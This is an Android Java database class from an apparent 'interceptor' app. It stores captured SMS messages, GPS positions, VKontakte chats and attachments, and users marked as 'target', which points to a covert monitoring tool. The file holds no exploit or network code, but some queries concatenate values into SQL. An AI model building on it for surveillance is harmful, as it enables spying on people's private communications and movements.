package org.darkdefender.interceptor.database;

import java.util.ArrayList;

import org.darkdefender.interceptor.models.Position;
import org.darkdefender.interceptor.models.SmsMessage;
import org.darkdefender.interceptor.models.VkAttachment;
import org.darkdefender.interceptor.models.VkMessages;
import org.darkdefender.interceptor.models.VkUser;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;

public class DataSource {

	private final Context ctx;
	private static final int DATABASE_VERSION = 1;
	private static final String DATABASE_NAME = "Interceptor";
	private DataBaseHelper mHelper = null;
	private SQLiteDatabase mDatabase = null;
	
	//SMS MESSAGES TABLE CONSTANTS
	public final static String SMS_TABLE = "sms_messages_table";
	private final static String COLUMN_ID = "col_id";
	private final static String COLUMN_TIME = "col_time";
	private final static String COLUMN_INCOMING = "col_incoming";
	private final static String COLUMN_FROM = "col_sender";
	private final static String COLUMN_TO = "col_receiver";
	private final static String COLUMN_MESSAGE = "col_message";
	
	//POSITION TABLE CONSTANTS
	public final static String POSITION_TABLE = "position_table";
	private final static String COLUMN_LAT = "col_lat";
	private final static String COLUMN_LNG = "col_lng";
	private final static String COLUMN_DATE = "col_date";

	//VKONTAKTE MESSAGES
	public final static String VK_MESSAGES_TABLE = "vk_messages";
	private final static String VK_COLUMN_ID = "id";
	private final static String VK_COLUMN_MESSAGE_ID = "mid";
	private final static String VK_COLUMN_TIME = "time";
	private final static String VK_COLUMN_IS_INCOME = "is_income";
	private final static String VK_COLUMN_USER_ID = "user_id";
	private final static String VK_COLUMN_HAS_ATTACHMENT = "has_attachment";
	private final static String VK_COLUMN_BODY = "message_body";
	
	//VK ATTACHMENTS 
	public final static String VK_ATTACHMENTS_TABLE = "vk_attachments";
	private final static String VK_ATT_ID = "id";
	private final static String VK_ATT_MESSAGE_ID = "mid";
	private final static String VK_ATT_TYPE = "attachment_type";
	private final static String VK_ATT_UNIQUE_ID = "unique_id";
		//IMAGE
		private final static String VK_ATT_IMG_SRC = "img_src";
		private final static String VK_ATT_IMG_SRC_BIG = "img_src_big";
		//VIDEO
		private final static String VK_ATT_VIDEO_TITLE = "video_title";
		private final static String VK_ATT_VIDEO_THUMB = "video_thumbnail";
		private final static String VK_ATT_VIDEO_OWNER = "video_owner_id";
		private final static String VK_ATT_VIDEO_ID = "video_id";
		//audio
		private final static String VK_ATT_AUDIO_TITLE = "audio_title";
		private final static String VK_ATT_AUDIO_ARTIST = "audio_artist";

	public final static String VK_USERS_TABLE = "users";
	private final static String VK_UID = "uid";
	private final static String VK_FIRST_NAME = "first_name";
	private final static String VK_LAST_NAME = "last_name";
	private final static String VK_PHOTO = "photo";
	private final static String VK_IS_TARGET = "is_target";
	
	public static class DataBaseHelper extends SQLiteOpenHelper {

		public DataBaseHelper(Context context) {
			super(context, DATABASE_NAME, null, DATABASE_VERSION);
		}
		
		@Override
		public void onCreate(SQLiteDatabase db) {
			
			//USERS TABLE 
			db.execSQL("CREATE TABLE "+VK_USERS_TABLE+" (" +
					VK_UID + " REAL, " +
					VK_FIRST_NAME + " VARCHAR(255), " +
					VK_LAST_NAME	+ " VARCHAR(255), " +
					VK_PHOTO + " TEXT, " +
					VK_IS_TARGET + " VARCHAR(255) );");
			
			//SMS MESSAGES TABLE CREATE
			db.execSQL("CREATE TABLE "+SMS_TABLE+" (" +
					COLUMN_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " +
					COLUMN_TIME + " REAL, " +
					COLUMN_INCOMING	+ " VARCHAR(255), " +
					COLUMN_FROM + " VARCHAR(255), " +
					COLUMN_TO + " VARCHAR(255), " +
					COLUMN_MESSAGE + " TEXT );");
			
			//POSITION TABLE CREATE
			db.execSQL("CREATE TABLE "+POSITION_TABLE+" (" +
					COLUMN_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " +
					COLUMN_LAT + " REAL, " +
					COLUMN_LNG	+ " REAL, " +
					COLUMN_DATE + " VARCHAR(255), " +
					COLUMN_TIME + " REAL);");
			
			//VK MESSAGES TABLE CREATE
			db.execSQL("CREATE TABLE "+VK_MESSAGES_TABLE+" (" +
					VK_COLUMN_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " +
					VK_COLUMN_MESSAGE_ID + " REAL, " +
					VK_COLUMN_TIME	+ " REAL, " +
					VK_COLUMN_IS_INCOME + " VARCHAR(255), " +
					VK_COLUMN_HAS_ATTACHMENT + " VARCHAR(255), " +
					VK_COLUMN_BODY + " TEXT, " +
					VK_COLUMN_USER_ID + " REAL );");
			
			//VK ATTACHMENTS TABLE CREATE 
			db.execSQL("CREATE TABLE "+VK_ATTACHMENTS_TABLE+" (" +
					VK_ATT_ID + " INTEGER PRIMARY KEY AUTOINCREMENT, " +
					VK_ATT_MESSAGE_ID + " REAL, " +
					VK_ATT_TYPE	+ " VARCHAR(255), " +
					//IMAGE
					VK_ATT_IMG_SRC + " TEXT, " +
					VK_ATT_IMG_SRC_BIG + " TEXT, " +
					//VIDEO
					VK_ATT_VIDEO_TITLE + " VARCHAR(255), " +
					VK_ATT_VIDEO_THUMB + " TEXT, " +
					VK_ATT_VIDEO_OWNER + " VARCHAR(255), " +
					VK_ATT_VIDEO_ID + " VARCHAR(255), " +
					//AUDIO
					VK_ATT_AUDIO_TITLE + " VARCHAR(255), " +
					VK_ATT_AUDIO_ARTIST + " VARCHAR(255), " +
					VK_ATT_UNIQUE_ID + " VARCHAR(255));");
			
		}

		@Override
		public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
			db.execSQL("DROP TABLE IF EXISTS "+SMS_TABLE);
			db.execSQL("DROP TABLE IF EXISTS "+POSITION_TABLE);
			onCreate(db);
		}
		
	}
	
	public DataSource(Context context){
		ctx = context;
	}
	public DataSource open(){
		mHelper = new DataBaseHelper(ctx);
		mDatabase = mHelper.getWritableDatabase();
		return this;
	}
	public void close(){
		if(mHelper != null){
			mHelper.close();	
		}
	}

	public long addUserInfo(long uid, String first_name, String last_name, String photo, boolean is_target) {
		ContentValues cv = new ContentValues();
			cv.put(VK_UID, uid);
			cv.put(VK_FIRST_NAME, first_name);
			cv.put(VK_LAST_NAME, last_name);
			cv.put(VK_PHOTO, photo);
			cv.put(VK_IS_TARGET, String.valueOf(is_target));
		return mDatabase.insert(VK_USERS_TABLE, null, cv);
	}
	public ArrayList<VkUser> getUsersInfo(){
		String[] columns = new String[]{VK_UID, VK_FIRST_NAME, VK_LAST_NAME, VK_PHOTO, VK_IS_TARGET};
		ArrayList<VkUser> response = new ArrayList<VkUser>();
		
		Cursor cursor = mDatabase.query(VK_USERS_TABLE, columns, null, null, null, null, null);
		for(cursor.moveToFirst(); !cursor.isAfterLast(); cursor.moveToNext()){
			VkUser usr = new VkUser();
			usr.setUid(cursor.getLong(0));
			usr.setFirst_name(cursor.getString(1));
			usr.setLast_name(cursor.getString(2));
			usr.setPhoto(cursor.getString(3));
			usr.setIs_target(Boolean.valueOf(cursor.getString(4)));
			response.add(usr);
		}
		return response;
	}
	public void addListOfUsers(ArrayList<VkUser> list)
	{
		for(int i=0; i<list.size(); i++){
			if(!isThereAUserWithId(list.get(i).getUid())){
				VkUser usr = list.get(i);
				addUserInfo(usr.getUid(), usr.getFirst_name(), usr.getLast_name(), usr.getPhoto(), usr.isIs_target());
			}
		}
	}
	public boolean isThereAUserWithId(long id){
		String[] columns = new String[]{VK_UID, VK_FIRST_NAME, VK_LAST_NAME, VK_PHOTO, VK_IS_TARGET};

		String WHERE = VK_UID+"='"+id+"'";
		Cursor cursor = mDatabase.query(VK_USERS_TABLE, columns, WHERE, null, null, null, null);
		return (cursor.getCount() > 0);
	}
	
	
	public long addSMSMessage(long time, boolean incoming, String from, String to, String msg) {
		ContentValues cv = new ContentValues();
			cv.put(COLUMN_TIME, time);
			cv.put(COLUMN_INCOMING, String.valueOf(incoming));
			cv.put(COLUMN_FROM, from);
			cv.put(COLUMN_TO, to);
			cv.put(COLUMN_MESSAGE, msg);
		return mDatabase.insert(SMS_TABLE, null, cv);
	}
	public ArrayList<SmsMessage> getSMSMessages(){
		String[] columns = new String[]{COLUMN_ID, COLUMN_TIME, COLUMN_INCOMING, COLUMN_FROM, COLUMN_TO, COLUMN_MESSAGE};
		ArrayList<SmsMessage> response = new ArrayList<SmsMessage>();
		
		Cursor cursor = mDatabase.query(SMS_TABLE, columns, null, null, null, null, null);
		for(cursor.moveToFirst(); !cursor.isAfterLast(); cursor.moveToNext()){
			SmsMessage sms = new SmsMessage();
				sms.setId(cursor.getInt(0));
				sms.setTime(cursor.getLong(1));
				sms.setIncoming(Boolean.valueOf(cursor.getString(2)));
				sms.setFrom(cursor.getString(3));
				sms.setTo(cursor.getString(4));
				sms.setMessage(cursor.getString(5));
			response.add(sms);
		}
		return response;
	}
	
	public long addLastPosition(double lat, double lng, String date, long time) {
		ContentValues cv = new ContentValues();
			cv.put(COLUMN_LAT, lat);
			cv.put(COLUMN_LNG, lng);
			cv.put(COLUMN_DATE, date);
			cv.put(COLUMN_TIME, time);
		return mDatabase.insert(POSITION_TABLE, null, cv);
	}
	public ArrayList<Position> getPositionsList(){
		String[] columns = new String[]{COLUMN_ID, COLUMN_LAT, COLUMN_LNG, COLUMN_DATE, COLUMN_TIME};
		ArrayList<Position> response = new ArrayList<Position>();
		
		Cursor cursor = mDatabase.query(POSITION_TABLE, columns, null, null, null, null, null);
		for(cursor.moveToFirst(); !cursor.isAfterLast(); cursor.moveToNext()){
			Position pos = new Position();
				pos.setId(cursor.getInt(0));
				pos.setLat(cursor.getDouble(1));
				pos.setLng(cursor.getDouble(2));
				pos.setDate(cursor.getString(3));
				pos.setTime(cursor.getLong(4));
			response.add(pos);
		}
		return response;
	}
	/* ################### Vk messages ################### */
	public long addVkMessage(long mid, long time, boolean is_incoming, boolean has_attachment, String body, long uid) {
		ContentValues cv = new ContentValues();
			cv.put(VK_COLUMN_MESSAGE_ID, mid);
			cv.put(VK_COLUMN_TIME, time);
			cv.put(VK_COLUMN_IS_INCOME, String.valueOf(is_incoming));
			cv.put(VK_COLUMN_HAS_ATTACHMENT, String.valueOf(has_attachment));
			cv.put(VK_COLUMN_BODY, body);
			cv.put(VK_COLUMN_USER_ID, uid);
		return mDatabase.insert(VK_MESSAGES_TABLE, null, cv);
	}

	public void addListOfVkMessages(ArrayList<VkMessages> list)
	{
		for(int i=0; i<list.size(); i++){
			if(!isThereAMessageWithId(list.get(i).getMid())){
				VkMessages m = list.get(i);
				addVkMessage(m.getMid(), m.getTime(), m.isIncoming(), m.hasAttachment(), m.getBody(), m.getUid());
//				Log.w("adding message", "message added "+m.getMid());	
			}else{
//				Log.e("adding message", "message exists");	
			}
		}
	}
	
	public ArrayList<VkMessages> getUsersFormVkMessages(){

		ArrayList<VkMessages> response = new ArrayList<VkMessages>();
		Cursor cursor = getVkMessagesCursorDistinctUsers();
		
		for(cursor.moveToFirst(); !cursor.isAfterLast(); cursor.moveToNext()){
			VkMessages vk = new VkMessages();
				vk.setId(cursor.getLong(0));
				vk.setMid(cursor.getLong(1));
				vk.setTime(cursor.getLong(2));
				vk.setIs_incoming(Boolean.valueOf(cursor.getString(3)));
				vk.setHas_attachment(Boolean.valueOf(cursor.getString(4)));
				vk.setBody(cursor.getString(5));
				vk.setUid(cursor.getLong(6));
			response.add(vk);
		}
		return response;
	}
	
	public ArrayList<VkMessages> getVkMessages(){

		ArrayList<VkMessages> response = new ArrayList<VkMessages>();
		Cursor cursor = getVkMessagesCursor(null);
		for(cursor.moveToFirst(); !cursor.isAfterLast(); cursor.moveToNext()){
			VkMessages vk = new VkMessages();
				vk.setId(cursor.getLong(0));
				vk.setMid(cursor.getLong(1));
				vk.setTime(cursor.getLong(2));
				vk.setIs_incoming(Boolean.valueOf(cursor.getString(3)));
				vk.setHas_attachment(Boolean.valueOf(cursor.getString(4)));
				vk.setBody(cursor.getString(5));
				vk.setUid(cursor.getLong(6));
			response.add(vk);
		}
		return response;
	}
	public boolean isThereAMessageWithId(long id){
		String[] columns = new String[]{	VK_COLUMN_ID, VK_COLUMN_MESSAGE_ID, VK_COLUMN_TIME, 
											VK_COLUMN_IS_INCOME, VK_COLUMN_HAS_ATTACHMENT, VK_COLUMN_BODY, 
											VK_COLUMN_USER_ID };

		String WHERE = VK_COLUMN_MESSAGE_ID+"='"+id+"'";
		Cursor cursor = mDatabase.query(VK_MESSAGES_TABLE, columns, WHERE, null, null, null, null);
		return (cursor.getCount() > 0);
	}
	public boolean isThereAnAttachmentWithId(String unique_id)
	{
		
		String[] columns = new String[]{	VK_ATT_ID, VK_ATT_MESSAGE_ID, VK_ATT_TYPE, 
				VK_ATT_IMG_SRC, VK_ATT_IMG_SRC_BIG, VK_ATT_VIDEO_TITLE, 
				VK_ATT_VIDEO_THUMB, VK_ATT_VIDEO_OWNER, VK_ATT_VIDEO_ID, 
				VK_ATT_AUDIO_TITLE, VK_ATT_AUDIO_ARTIST, VK_ATT_UNIQUE_ID };
		
		String WHERE = VK_ATT_UNIQUE_ID + " LIKE '"+unique_id+"'";
		
		Cursor cursor = mDatabase.query(VK_ATTACHMENTS_TABLE, columns, WHERE, null, null, null, null);
		return (cursor.getCount() > 0);
	}
	/* ################### Vk messages < ------ ################### */
	
	/* ################### Vk Attachments ################### */
	public long addVkMessageAttachment(long mid, String type, String img_src, String img_src_big, String video_title, 
										String video_thumb, String video_owner, String video_id, String audio_title, 
										String audio_artist, String unique_id) 
	{
		ContentValues cv = new ContentValues();
			cv.put(VK_ATT_MESSAGE_ID, mid);
			cv.put(VK_ATT_TYPE, type);
			//IMAGE
			cv.put(VK_ATT_IMG_SRC, img_src);
			cv.put(VK_ATT_IMG_SRC_BIG, img_src_big);
			//VIDEO
			cv.put(VK_ATT_VIDEO_TITLE, video_title);
			cv.put(VK_ATT_VIDEO_THUMB, video_thumb);
			cv.put(VK_ATT_VIDEO_OWNER, video_owner);
			cv.put(VK_ATT_VIDEO_ID, video_id);
			//AUDIO
			cv.put(VK_ATT_AUDIO_TITLE, audio_title);
			cv.put(VK_ATT_AUDIO_ARTIST, audio_artist);
			cv.put(VK_ATT_UNIQUE_ID, unique_id);
		return mDatabase.insert(VK_ATTACHMENTS_TABLE, null, cv);
	}
	public void addListOfVkMSGAttachments(ArrayList<VkAttachment> list)
	{
		for(int i=0; i<list.size(); i++){
			VkAttachment a = list.get(i);
			if( !isThereAnAttachmentWithId(a.getUnique_id()) )
			{

				addVkMessageAttachment(a.getMid(), a.getType(), a.getImg_src(), a.getImg_src_big(), 
						a.getVideo_title(), a.getVideo_thumb(), a.getVideo_owner(), a.getVideo_id(), 
						a.getAudio_title(), a.getAudio_artist(), a.getUnique_id());
				
//				Log.w("adding attachment", "attachment added "+a.getUnique_id());	
			}else{
//				Log.e("adding attachment", "attachment exists");	
			}
		}
	}
	public ArrayList<VkAttachment> getVkAttachments()
	{
		String[] columns = new String[]{	VK_ATT_ID, VK_ATT_MESSAGE_ID, VK_ATT_TYPE, 
											VK_ATT_IMG_SRC, VK_ATT_IMG_SRC_BIG, VK_ATT_VIDEO_TITLE, 
											VK_ATT_VIDEO_THUMB, VK_ATT_VIDEO_OWNER, VK_ATT_VIDEO_ID, 
											VK_ATT_AUDIO_TITLE, VK_ATT_AUDIO_ARTIST, VK_ATT_UNIQUE_ID};
		
		ArrayList<VkAttachment> response = new ArrayList<VkAttachment>();
		Cursor cursor = mDatabase.query(VK_ATTACHMENTS_TABLE, columns, null, null, null, null, null);
		for(cursor.moveToFirst(); !cursor.isAfterLast(); cursor.moveToNext()){
			VkAttachment vk_at = new VkAttachment();
			
			Log.w("saving",cursor.getString(2));
			
				vk_at.setId(cursor.getInt(0));
				vk_at.setMid(cursor.getLong(1));
				vk_at.setType(cursor.getString(2));
				vk_at.setImg_src(cursor.getString(3));
				vk_at.setImg_src_big(cursor.getString(4));
				vk_at.setVideo_title(cursor.getString(5));
				vk_at.setVideo_thumb(cursor.getString(6));
				vk_at.setVideo_owner(cursor.getString(7));
				vk_at.setVideo_id(cursor.getString(8));
				vk_at.setAudio_title(cursor.getString(9));
				vk_at.setAudio_artist(cursor.getString(10));
				vk_at.setUnique_id(cursor.getString(11));
			response.add(vk_at);
		}
		return response;
	}
	
	/* ################### Vk Attachments < ----- ################### */
	
	
	//Cursores
	private Cursor getVkMessagesCursor(String WHERE){
		String[] columns = new String[]{	VK_COLUMN_ID, VK_COLUMN_MESSAGE_ID, VK_COLUMN_TIME, 
				VK_COLUMN_IS_INCOME, VK_COLUMN_HAS_ATTACHMENT, VK_COLUMN_BODY, 
				VK_COLUMN_USER_ID };

		
		return mDatabase.query(VK_MESSAGES_TABLE, columns, WHERE, null, null, null, null);
	}
	private Cursor getVkMessagesCursorDistinctUsers(){
		String[] columns = new String[]{	VK_COLUMN_ID, VK_COLUMN_MESSAGE_ID, VK_COLUMN_TIME, 
				VK_COLUMN_IS_INCOME, VK_COLUMN_HAS_ATTACHMENT, VK_COLUMN_BODY, 
				VK_COLUMN_USER_ID };
		
		return mDatabase.query(true, VK_MESSAGES_TABLE, columns, null, null, VK_COLUMN_USER_ID, null, null, null);
	}
	
	//CLEAN TABLE BY TABLE NANE
	public void cleanTable(final String TABLE_NAME){
//		mDatabase.delete(TABLE_NAME, null, null);
	}
		
}
